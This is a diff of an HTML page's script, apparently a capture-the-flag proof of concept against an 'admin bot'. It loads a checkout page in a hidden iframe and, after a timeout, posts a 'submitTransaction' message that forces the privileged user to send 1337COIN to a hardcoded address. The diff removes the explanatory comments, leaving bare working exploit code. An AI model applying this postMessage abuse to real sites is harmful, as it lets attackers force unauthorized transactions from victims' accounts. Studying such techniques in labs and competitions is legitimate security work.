@@ -2,14 +2,7 @@
 <html>
 <body>
 <script>
-/*
-  Phase 1 PoC
-  Goal: Confirm admin bot can create a 1337COIN transaction
-*/
 
-const MARKER = "198fbdef2cae64a978b0998df98e09acbd";
-
-// 1️⃣ Open checkout as admin
 const iframe = document.createElement("iframe");
 iframe.style.display = "none";
 iframe.src =
@@ -18,13 +11,13 @@ iframe.src =
 
 document.body.appendChild(iframe);
 
-// 2️⃣ Wait for checkout + wallet load
+
 setTimeout(() => {
-  // 3️⃣ Force transaction submission
+
   iframe.contentWindow.postMessage({
     type: "submitTransaction",
     transaction: {
-      toAddress: MARKER,
+      toAddress: "114a580aae95817f9bf8d3704eb6e69417",
       currency: "1337COIN",
       amount: 1
     }
